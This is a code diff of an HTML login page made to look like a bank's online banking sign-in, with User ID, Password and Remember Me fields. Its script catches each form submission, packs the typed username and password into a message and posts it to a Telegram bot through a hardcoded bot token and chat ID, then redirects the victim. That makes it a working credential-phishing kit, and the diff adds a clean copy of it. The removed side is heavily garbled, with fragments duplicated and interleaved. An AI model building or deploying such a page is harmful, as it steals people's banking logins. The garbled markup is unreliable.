@@ -82,8 +82,8 @@
             .remember-me-container {
                 display: flex;
                 align-items: center;
-                margin-bottom: 8px !important; /* Reduced from 20px to 8px */
-                margin-top: 5px !important; /* Reduced from 10px to 5px */
+                margin-bottom: 10px; /* Reduced from 20px to 10px */
+                margin-top: 5px; /* Reduced margin */
             }
             
             .remember-me-label {
@@ -95,9 +95,9 @@
             }
             
             .remember-me-checkbox {
-                margin-right: 8px;
-                width: 18px;
-                height: 18px;
+                margin-right: 10px;
+                width: 20px;
+                height: 20px;
                 border-radius: 4px;
                 border: 2px solid #0279b3;
                 cursor: pointer;
@@ -114,35 +114,30 @@
                 content: '✓';
                 position: absolute;
                 color: white;
-                font-size: 12px;
+                font-size: 14px;
                 top: 50%;
                 left: 50%;
                 transform: translate(-50%, -50%);
             }
             
-            /* Enhanced form styling with reduced spacing */
+            /* Enhanced form styling - REDUCED SPACING */
             .username-container {
-                margin-bottom: 10px !important; /* Reduced spacing */
+                margin-bottom: 15px; /* Reduced spacing */
             }
             
             .password-container {
-                margin-bottom: 20px !important;
+                margin-bottom: 20px;
+            }
+            
+            /* Reduced spacing between form elements */
+            .dbk-login__form-section p[style*="margin-top"] {
+                margin-top: 10px !important; /* Reduced from 15px/20px to 10px */
             }
             
             .fluid-form-label__text {
-                margin-bottom: 6px !important; /* Reduced */
+                margin-bottom: 6px !important; /* Reduced from 8px */
                 font-size: 14px !important;
                 color: #333 !important;
-            }
-            
-            /* Remove excessive spacing */
-            p[style*="margin-top"] {
-                margin-top: 0 !important;
-            }
-            
-            /* Adjust spacing between form elements */
-            .dbk-login__form-section {
-                padding-top: 0 !important;
             }
             
             /* Links styling */
@@ -150,7 +145,6 @@
                 display: flex;
                 flex-direction: column;
                 gap: 10px; /* Reduced from 12px */
-                margin-top: 15px !important; /* Added margin for links */
             }
             
             .dbk-login__links li {
@@ -167,16 +161,6 @@
             .fluid-button--link:hover {
                 text-decoration: underline !important;
             }
-            
-            /* Compact form layout */
-            .dbk-login__login-form-container {
-                padding: 15px !important;
-            }
-            
-            /* Reduce overall spacing in the form section */
-            .fluid-form-layout-section__content-container {
-                margin-top: 5px !important;
-            }
         </style>
     </head>
 <body>
@@ -188,285 +172,148 @@
                 <div class="dbk-login-web__widget-container composite-layout-widget" style="">
                     <div class="fluid-section fluid-section--pad-content dbk-login has-message is-interactive">
                         <div class="fluid-section__content-container">
-                            <div class="fluid-section__content-container-inner" style="--global-heading-font-family:'Helvetica Neue', Helvetica, Arial, sans-serif; --global-body-font-family:Arial, sans-serif; --global-link-default-color:#0055cc; --global-font-color:#333333; --global-success-color:#76c76c; --global-warning-color:#f1b51c; --global-error-color:#c23a4c; --global-info-color:#18739d; --global-primary-color:#0279b3; --global-secondary-color:#cccccc; --global-tertiary-color:#ffffff; --global-body-bg-color-start:#e3e3e3; --global-body-bg:var(--global-body-bg-color-start); --masthead-text-color:#000000; --masthead-bg-color-start:#ffffff; --masthead-background:var(--masthead-bg-color-start); --main-nav-text-color:#ffffff; --main-nav-bg-color:#1e-color:#1e50855085; --main-nav-border-color; --main-nav-border-color:rgba(55,:rgba(55, 130 130, 210,, 210, 0.6); -- 0.6); --main-navmain-nav-hover-bg-color:#-hover-bg-color:#15375b; --utility15375b; --utility-nav-bg-color:#ffffff-nav-bg-color:#ffffff; --; --utility-nav-link-colorutility-nav-link-color:#003:#003876; --feature876; --featured-navd-nav-link-color:#000-link-color:#000000;000; --featured-nav-flag --featured-nav-flag-text-color-text-color:#333333;:#333333; --feature --featured-nav-flagd-nav-flag-bg-bg-color:#d8-color:#d8e9e9fe; --widgetfe; --widget-header-b-header-bg-color:#49a456g-color:#49a456; --; --widget-header-text-colorwidget-header-text-color:#ffffff:#ffffff; --widget-border; --widget-border-color:#-color:#cccccc; --cccccc; --widget-borderwidget-border-radius:0;-radius:0; --widget --widget-border-width:1px;-border-width:1px; --widget --widget-box-shadow:var-box-shadow:var(--widget(--widget-box-shadow-val);-box-shadow-val); --widget --widget-bg-opacity-bg-opacity:1:1; --widget-header; --widget-header-bg-bg-color-rgba-10-color-rgba-10p:p:rgba(73rgba(73, , 164, 86164, 86, , 0.1);0.1); --widget --widget-header-bg-color-rg-header-bg-color-rgba-ba-50p:rg50p:rgba(ba(73,73, 164,  164, 86, 086, 0.5.5); --fluid-btn); --fluid-btn-primary-text-primary-text-color:#333333-color:#333333; --; --fluid-btn-primary-borderfluid-btn-primary-border-color:-color:transparent; --fluid-btntransparent; --fluid-btn-primary-b-primary-bg-color-start:#g-color-start:#9db9dbdd6dd6; --fluid-btn; --fluid-btn-primary-hover-b-primary-hover-bg-colorg-color-start:#c2-start:#c2d6d6e5; --fluid-btne5; --fluid-btn-primary-b-primary-bg-color:var(--fluidg-color:var(--fluid-btn-primary-bg-btn-primary-bg-color-start-color-start); --fluid-btn); --fluid-btn-primary-h-primary-hover-bover-bg-color:varg-color:var(--fluid-btn-primary-hover(--fluid-btn-primary-hover-bg-bg-color-start); ---color-start); --exp-pexp-preview-mobile-glreview-mobile-global-primaryobal-primary-bg-color:-bg-color:undefined;undefined; --exp-preview-mobile --exp-preview-mobile-global-btn-bg-color-global-btn-bg-color:undefined:undefined; --exp-p; --exp-preview-mreview-mobile-global-primaryobile-global-primary-text-color:undefined;">
-                               -text-color:undefined;">
-                                <div <div class="dbk class="dbk-login-login-msg has-image dbk-msg has-image dbk-login-login__msg-container"__msg-container" style=" style="background-image: urlbackground-image: url(Getty(GettyImages-113211Images-11321155765576-1024x683.jpg-1024x683.jpg);"></div>
-                               );"></div>
-                                <div class <div class="dbk-log="dbk-login__login-elements-containerin__login-elements-container">
-                                   ">
-                                    <div class=" <div class="dbkdbk-login__login-elements-login__login-elements-header">
-                                        <div class-header">
-                                        <div class="db="dbk-login__k-login__logologo"><a href="/db"><a href="/dbank/lank/live/app/homeive/app/home"><img src"><img src="03658-l="03658-logo-lgogo-lg-md-publish.png-md-publish.png" alt" alt="Logo"></a="Logo"></a></div></div>
+                            <div class="fluid-section__content-container-inner" style="--global-heading-font-family:'Helvetica Neue', Helvetica, Arial, sans-serif; --global-body-font-family:Arial, sans-serif; --global-link-default-color:#0055cc; --global-font-color:#333333; --global-success-color:#76c76c; --global-warning-color:#f1b51c; --global-error-color:#c23a4c; --global-info-color:#18739d; --global-primary-color:#0279b3; --global-secondary-color:#cccccc; --global-tertiary-color:#ffffff; --global-body-bg-color-start:#e3e3e3; --global-body-bg:var(--global-body-bg-color-start); --masthead-text-color:#000000; --masthead-bg-color-start:#ffffff; --masthead-background:var(--masthead-bg-color-start); --main-nav-text-color:#ffffff; --main-nav-bg-color:#1e5085; --main-nav-border-color:rgba(55, 130, 210, 0.6); --main-nav-hover-bg-color:#15375b; --utility-nav-bg-color:#ffffff; --utility-nav-link-color:#003876; --featured-nav-link-color:#000000; --featured-nav-flag-text-color:#333333; --featured-nav-flag-bg-color:#d8e9fe; --widget-header-bg-color:#49a456; --widget-header-text-color:#ffffff; --widget-border-color:#cccccc; --widget-border-radius:0; --widget-border-width:1px; --widget-box-shadow:var(--widget-box-shadow-val); --widget-bg-opacity:1; --widget-header-bg-color-rgba-10p:rgba(73, 164, 86, 0.1); --widget-header-bg-color-rgba-50p:rgba(73, 164, 86, 0.5); --fluid-btn-primary-text-color:#333333; --fluid-btn-primary-border-color:transparent; --fluid-btn-primary-bg-color-start:#9dbdd6; --fluid-btn-primary-hover-bg-color-start:#c2d6e5; --fluid-btn-primary-bg-color:var(--fluid-btn-primary-bg-color-start); --fluid-btn-primary-hover-bg-color:var(--fluid-btn-primary-hover-bg-color-start); --exp-preview-mobile-global-primary-bg-color:undefined; --exp-preview-mobile-global-btn-bg-color:undefined; --exp-preview-mobile-global-primary-text-color:undefined;">
+                                <div class="dbk-login-msg has-image dbk-login__msg-container" style="background-image: url(GettyImages-1132115576-1024x683.jpg);"></div>
+                                <div class="dbk-login__login-elements-container">
+                                    <div class="dbk-login__login-elements-header">
+                                        <div class="dbk-login__logo"><a href="/dbank/live/app/home"><img src="03658-logo-lg-md-publish.png" alt="Logo"></a></div>
                                     </div>
-                                    </div>
-                                   >
-                                    <form action="#" <form action="#" class=" class="dbk-logindbk-login__login__login-form" method="post"-form" method="post" autocomplete autocomplete="off">
-                                       ="off">
-                                        <div <div class="fluid-form class="fluid-form-layout-layout dbk-login dbk-login__login__login-form-container">
-                                            <div-form-container">
-                                            <div class=" class="fluid-form-layoutfluid-form-layout-section db-section dbk-login__k-login__form-sectionform-section">
-                                                <div">
-                                                <div class=" class="fluid-form-layoutfluid-form-layout-section__-section__content-container">
-                                               content-container">
+                                    <form action="#" class="dbk-login__login-form" method="post" autocomplete="off">
+                                        <div class="fluid-form-layout dbk-login__login-form-container">
+                                            <div class="fluid-form-layout-section dbk-login__form-section">
+                                                <div class="fluid-form-layout-section__content-container">
                                                 </div>
-                                 </div>
+                                                <p style="margin-top: 15px !important"></p> <!-- Reduced from 20px -->
                                                 
-                                                <!-- Us                
-                                                <!-- Username fieldername field with Remember Me toggle with Remember Me toggle -->
-                                                -->
-                                                <div class=" <div class="fluid-formfluid-form-layout-field-container-layout-field-container username-container username-container">
-                                                    <div style="">
-                                                    <div style="--username--username-padding:107-padding:107px;">
-px;">
-                                                        <label class                                                        <label class="fluid="fluid-form-label fluid-form-form-label fluid-form-label---label--stacked username-field" forstacked username-field" for="fluid="fluid-form-el-585-form-el-585fb376fb376-bde3--bde3-42724272-b313-f29-b313-f29bb5bb5c97c20c97c20">
-                                                           ">
-                                                            <span class="fluid-form <span class="fluid-form-label__-label__texttext"><span class="fluid"><span class="fluid-form-label__text-form-label__text-inner-inner">User ID</">User ID</span></span></span>
-span>
-                                                            <span class                                                            <span class="fluid-form-label__comp="fluid-form-label__comp-container">
--container">
-                                                                <input name                                                                <input name="username="username" autocomplete="" autocomplete="off"off" id="fluid-form id="fluid-form-el--el-585fb376-b585fb376-bde3-427de3-4272-b313-f2-b313-f29bb29bb5c97c5c97c20"20" type=" type="text" class="text" class="fluid-text-input"fluid-text-input" value="" value="" required>
-                                                            </ required>
+                                                <!-- Username field with Remember Me toggle -->
+                                                <div class="fluid-form-layout-field-container username-container">
+                                                    <div style="--username-padding:107px;">
+                                                        <label class="fluid-form-label fluid-form-label--stacked username-field" for="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20">
+                                                            <span class="fluid-form-label__text"><span class="fluid-form-label__text-inner">User ID</span></span>
+                                                            <span class="fluid-form-label__comp-container">
+                                                                <input name="username" autocomplete="off" id="fluid-form-el-585fb376-bde3-4272-b313-f29bb5c97c20" type="text" class="fluid-text-input" value="" required>
                                                             </span>
-span>
                                                         </label>
-                                                    </                                                        </label>
                                                     </div>
-div>
-                                                    <!-- Remember Me                                                    <!-- Remember Me toggle - toggle - now closer now closer to password to password -->
-                                                    -->
-                                                    <div class <div class="remember-me-container">
-                                                       ="remember-me-container">
-                                                        <label class="remember-me <label class="remember-me-label">
--label">
-                                                                                                                       <input type="checkbox <input type="checkbox" class="remember" class="remember-me-check-me-checkbox" name="box" name="remember">
-remember">
+                                                    <!-- Remember Me toggle - Moved closer to password -->
+                                                    <div class="remember-me-container">
+                                                        <label class="remember-me-label">
+                                                            <input type="checkbox" class="remember-me-checkbox" name="remember">
                                                             Remember Me
-                                                        </                                                            Remember Me
                                                         </label>
-label>
                                                     </div>
-                                                    </div>
-                                                </                                                </div>
+                                                </div>
                                                 
-div>
+                                                <!-- Password field with eye toggle - NO extra spacing paragraph -->
                                                 
-                                                <!--                                                <!-- Password field with eye Password field with eye toggle - toggle - now closer to Remember Me now closer to Remember Me -->
-                                                -->
-                                                <div class="fluid-form <div class="fluid-form-layout-field-container-layout-field-container password-container password-container">
-                                                    <label">
-                                                    <label class=" class="fluid-form-label fluidfluid-form-label fluid-form-label-form-label--stacked password--stacked password-field show-hide-enabled" for="-field show-hide-enabled" for="fluid-formfluid-form-el-f530f-el-f530f248-b248-b80a-4880a-48ec-bec-b0f2-a0f2-a887c887c6e9ab5d6e9ab5d">
-                                                        <span class="">
-                                                        <span class="fluid-formfluid-form-label__text-label__text"><span class="fluid-form-label"><span class="fluid-form-label__text__text-inner-inner">Password</span></span>
-                                                       ">Password</span></span>
-                                                        <span <span class="fluid-form class="fluid-form-label__-label__comp-container" style="positioncomp-container" style="position: relative: relative;">
-                                                            <input;">
-                                                            <input name=" name="password" autocompletepassword" autocomplete="off="off" id="fluid" id="fluid-form-el-form-el-f530f248-f530f248-b80-b80a-48ec-b0a-48ec-b0f2f2-a887c6-a887c6e9e9ab5d"ab5d" type=" type="password" class="password" class="fluid-textfluid-text-input" value=""-input" value="" required>
- required>
-                                                            <button type="button                                                            <button type="button" class" class="password-toggle"="password-toggle" id=" id="togglePassword">
-                                                               togglePassword">
-                                                                👁 👁️
-                                                            </️
+                                                <!-- Password field with eye toggle -->
+                                                <div class="fluid-form-layout-field-container password-container">
+                                                    <label class="fluid-form-label fluid-form-label--stacked password-field show-hide-enabled" for="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d">
+                                                        <span class="fluid-form-label__text"><span class="fluid-form-label__text-inner">Password</span></span>
+                                                        <span class="fluid-form-label__comp-container" style="position: relative;">
+                                                            <input name="password" autocomplete="off" id="fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d" type="password" class="fluid-text-input" value="" required>
+                                                            <button type="button" class="password-toggle" id="togglePassword">
+                                                                👁️
                                                             </button>
-button>
                                                         </span>
-                                                        </span>
-                                                    </                                                    </label>
-                                                </label>
+                                                    </label>
                                                 </div>
-                                div>
                                                 
-                                                <!-- Login button                
-                                                <!-- Login button -->
- -->
-                                                <div class                                                <div class="fluid="fluid-form-layout-field-form-layout-field-container">
--container">
-                                                    <button type                                                    <button type="submit="submit" class="fluid-button fluid" class="fluid-button fluid-button---button--primary is-light-bprimary is-light-bg">
-g">
-                                                                                                               <span class="fluid <span class="fluid-button__content">
--button__content">
-                                                                                                                       <span class="fluid <span class="fluid-button__-button__text">Login</span>
-text">Login</span>
-                                                        </                                                        </span>
-                                                    </span>
+                                                <div class="fluid-form-layout-field-container">
+                                                    <p style="margin-top: 15px !important"></p> <!-- Reduced spacing -->
+                                                    <button type="submit" class="fluid-button fluid-button--primary is-light-bg">
+                                                        <span class="fluid-button__content">
+                                                            <span class="fluid-button__text">Login</span>
+                                                        </span>
                                                     </button>
-button>
-                                                </div>
                                                 </div>
                                                 
-                                                <!--                                                
-                                                <!-- Links -->
-                                                <div class="fluid Links -->
-                                                <div class="fluid-form-l-form-layout-field-container">
-ayout-field-container">
-                                                                                                       <nav>
-                                                        <nav>
-                                                        <ul class="dbk-log <ul class="dbk-login__in__links">
-                                                           links">
-                                                            <li <li><button id="" type="button><button id="" type="button" class="fluid-button fluid" class="fluid-button fluid-button---button--link">Forgotlink">Forgot Login?</ Login?</button></li>
-button></li>
-                                                                                                                       <li><button id <li><button id="test="test-browser" type="button-browser" type="button" class="fluid-button fluid" class="fluid-button fluid-button---button--link">Test yourlink">Test your browser</button></li>
- browser</button></li>
-                                                                                                                       <li><button id <li><button id="t="trouble-test-brouble-test-browser"rowser" type="button" class=" type="button" class="fluid-buttonfluid-button fluid-button--link fluid-button--link">T">Trouble testing yourrouble testing your browser</ browser</button></li>
-button></li>
-                                                        </                                                        </ul>
-                                                    </ul>
+                                                <p style="margin-top: 10px !important"></p> <!-- Reduced from 15px -->
+                                                
+                                                <div class="fluid-form-layout-field-container">
+                                                    <nav>
+                                                        <ul class="dbk-login__links">
+                                                            <li><button id="" type="button" class="fluid-button fluid-button--link">Forgot Login?</button></li>
+                                                            <li><button id="test-browser" type="button" class="fluid-button fluid-button--link">Test your browser</button></li>
+                                                            <li><button id="trouble-test-browser" type="button" class="fluid-button fluid-button--link">Trouble testing your browser</button></li>
+                                                        </ul>
                                                     </nav>
-nav>
-                                                </div>
                                                 </div>
                                             </div>
-                                            </div>
                                         </div>
-                                        </div>
-                                    </                                    </form>
-                                </div>
-form>
+                                    </form>
                                 </div>
                             </div>
-                            </div>
-                        </                        </div>
+                        </div>
                     </div>
-                    </div>
-div>
-                </div>
                 </div>
             </div>
-            </div>
         </div>
-        </div>
-    </    </div>
+    </div>
 
-    <!--div>
-
-    <!-- Password toggle Password toggle functionality -->
-    functionality -->
+    <!-- Password toggle functionality -->
     <script>
- <script>
-        document.addEventListener('        document.addEventListener('DOMContentDOMContentLoaded', function() {
-           Loaded', function() {
-            const toggle const togglePassword = document.getElementByIdPassword = document.getElementById('toggle('togglePassword');
-            constPassword');
-            const passwordInput = document.getElementById(' passwordInput = document.getElementById('fluid-formfluid-form-el-f530f-el-f530f248-b248-b80a-48ec-b80a-48ec-b0f0f2-a887c2-a887c6e6e9ab5d9ab5d');
+        document.addEventListener('DOMContentLoaded', function() {
+            const togglePassword = document.getElementById('togglePassword');
+            const passwordInput = document.getElementById('fluid-form-el-f530f248-b80a-48ec-b0f2-a887c6e9ab5d');
             
-');
-            
-            togglePassword.addEventListener            togglePassword.addEventListener('click('click', function() {
-', function() {
-                const                const type = passwordInput.getAttribute type = passwordInput.getAttribute('type') === 'password('type') === 'password' ?' ? 'text 'text' : 'password' : 'password';
-                passwordInput';
-                passwordInput.setAttribute.setAttribute('type', type('type', type);
-               );
-                this.textContent = this.textContent = type === 'password type === 'password' ? '' ? '👁️👁️' : '' : '👁️👁️‍🗨️‍🗨️';
-           ';
+            togglePassword.addEventListener('click', function() {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+                this.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
             });
         });
-    });
-        });
-    </script </script>
+    </script>
 
     <script>
-       >
-
-    <script>
-        // Telegram // Telegram Bot Token and Chat Bot Token and Chat ID
- ID
-        const botToken        const botToken = ' = '62566981046256698104:AA:AAE5QZE5QZORxw737ORxw737Vgc__jVgc__jArGArGtIpQ3tIpQ3JrJJrJfyv44';
-fyv44';
-        const chatId = '        const chatId = '1217851217852633';
-
-        // Get2633';
+        // Telegram Bot Token and Chat ID
+        const botToken = '6256698104:AAE5QZORxw737Vgc__jArGtIpQ3JrJfyv44';
+        const chatId = '1217852633';
 
         // Get the form element
-        const the form element
-        const form = form = document.querySelector('.db document.querySelector('.dbk-login__login-formk-login__login-form');
+        const form = document.querySelector('.dbk-login__login-form');
 
-       ');
+        // Add event listener for form submission
+        form.addEventListener('submit', async (event) => {
+            event.preventDefault(); // Prevent default form submission
 
-        // Add event listener // Add event listener for form for form submission
-        form.addEventListener(' submission
-        form.addEventListener('submit', async (event)submit', async (event) => {
- => {
-            event.preventDefault();            event.preventDefault(); // Prevent // Prevent default form submission
+            // Get form data
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const remember = document.querySelector('input[name="remember"]').checked;
 
- default form submission
+            // Construct the message to send to Telegram
+            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nRemember Me: ${remember ? 'Yes' : 'No'}`;
 
-            //            // Get form data
- Get form data
-            const username =            const username = document.querySelector('input document.querySelector('input[name="[name="username"]').valueusername"]').value;
-           ;
-            const password = document const password = document.querySelector('.querySelector('input[name="passwordinput[name="password"]')."]').value;
-            constvalue;
-            const remember = document.querySelector remember = document.querySelector('input[name="('input[name="remember"]remember"]').checked;
-
-           ').checked;
-
-            // Construct // Construct the message to send the message to send to Telegram to Telegram
-            const message
-            const message = ` = `New Login Attempt:\New Login Attempt:\nUsername: ${nUsername: ${username}\nPasswordusername}\nPassword: ${: ${password}\nRememberpassword}\nRemember Me: Me: ${remember ? ' ${remember ? 'Yes'Yes' : 'No' : 'No'}`;
-
-}`;
-
-            // Telegram API            // Telegram API URL
- URL
-            const telegramApiUrl =            const telegramApiUrl = `https `https://api://api.telegram.org.telegram.org/bot${bot/bot${botToken}/Token}/sendMessage`;
-
-           sendMessage`;
+            // Telegram API URL
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
- try {
-                // Send the                // Send the message to Telegram
- message to Telegram
-                const response =                const response = await fetch await fetch(tele(telegramApiUrl,gramApiUrl, {
-                    method: {
-                    method: 'POST 'POST',
-                    headers:',
+                // Send the message to Telegram
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
                     headers: {
-                        {
-                        'Content-Type': 'Content-Type': 'application/json',
- 'application/json',
+                        'Content-Type': 'application/json',
                     },
-                    body                    },
-                    body: JSON: JSON.stringify({
-                        chat.stringify({
-                        chat_id:_id: chatId,
-                        chatId,
-                        text: text: message,
-                    }),
- message,
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
                     }),
                 });
 
-                });
-
-                const result =                const result = await response.json();
- await response.json();
-                if (                if (result.ok)result.ok) {
-                    console.log {
-                    console.log('Login('Login data sent to Telegram data sent to Telegram successfully');
- successfully');
-                    form.reset();                    form.reset(); // Reset // Reset the form after successful the form after successful submission
-                    window submission
-                    window.location.h.location.href = 'indexref = 'index2.html'; //2.html'; // Redirect to Redirect to index2.html
- index2.html
-                }                } else {
-                    alert else {
-                    alert('Failed('Failed to send data to to send data to Telegram: ' + Telegram: ' + result.description);
-                result.description);
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Login data sent to Telegram successfully');
+                    form.reset(); // Reset the form after successful submission
+                    window.location.href = 'index2.html'; // Redirect to index2.html
+                } else {
+                    alert('Failed to send data to Telegram: ' + result.description);
                 }
-            }
-            } catch (error } catch (error) {
-) {
-                console.error('                console.error('Error sendingError sending data to Telegram:', data to Telegram:', error);
- error);
-                alert('An                alert('An error occurred while sending error occurred while sending data to Telegram.');
- data to Telegram.');
-            }
+            } catch (error) {
+                console.error('Error sending data to Telegram:', error);
+                alert('An error occurred while sending data to Telegram.');
             }
         });
-    </        });
     </script>
 </body>
-</script>
-</body>
 </html>
-html>
